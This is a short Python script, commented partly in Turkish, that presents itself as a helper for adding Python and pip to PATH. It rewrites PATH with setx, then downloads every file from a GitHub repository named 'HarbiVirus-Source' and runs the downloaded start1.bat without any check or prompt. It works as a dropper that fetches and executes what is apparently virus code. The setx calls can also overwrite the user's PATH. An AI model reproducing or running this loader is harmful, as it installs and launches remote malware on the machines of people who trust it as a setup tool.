import os
import requests
import sys

def add_to_path(directory):
    if directory not in os.environ["PATH"]:
        os.environ["PATH"] += os.pathsep + directory

def add_python_and_pip_to_path():
    python_dir = os.path.dirname(sys.executable)
    scripts_dir = os.path.join(python_dir, 'Scripts')
    
    # add python and scripts to PATH
    add_to_path(python_dir)
    add_to_path(scripts_dir)

    # upgrade path
    new_path = os.environ["PATH"]
    os.system(f'setx PATH "{new_path}"')

def clear_redundant_paths():
    # get the PATH def
    path = os.environ["PATH"]
    # remove the looping defs from PATH
    path_list = list(dict.fromkeys(path.split(os.pathsep)))
    # set the new PATH
    new_path = os.pathsep.join(path_list)
    os.system(f'setx PATH "{new_path}"')

def download_files_from_github(repo_url):
    # list the files with da github api
    response = requests.get(repo_url)
    files = response.json()

    # download da files
    for file in files:
        if file['type'] == 'file':
            file_name = file['name']
            download_url = file['download_url']
            
            print(f"İndiriliyor: {file_name}")
            file_response = requests.get(download_url)

            # save them to dir
            with open(file_name, 'wb') as f:
                f.write(file_response.content)

    print("Tüm dosyalar başarıyla indirildi!")

# GitHub repository URL
repo_url = "https://api.github.com/repos/Unknowndestroy/HarbiVirus-Source/contents/"

# main
if __name__ == "__main__":
    # Python ve pip dizinlerini PATH'e ekle
    add_python_and_pip_to_path()
    clear_redundant_paths()
    print("Python and PIP added to PATH.")

    # download the files from github to avaliable folder
    download_files_from_github(repo_url)
    
    print("Tüm dosyalar indirildi!")

    # start start
    os.startfile("start1.bat")
    print("start1.bat başlatıldı.")
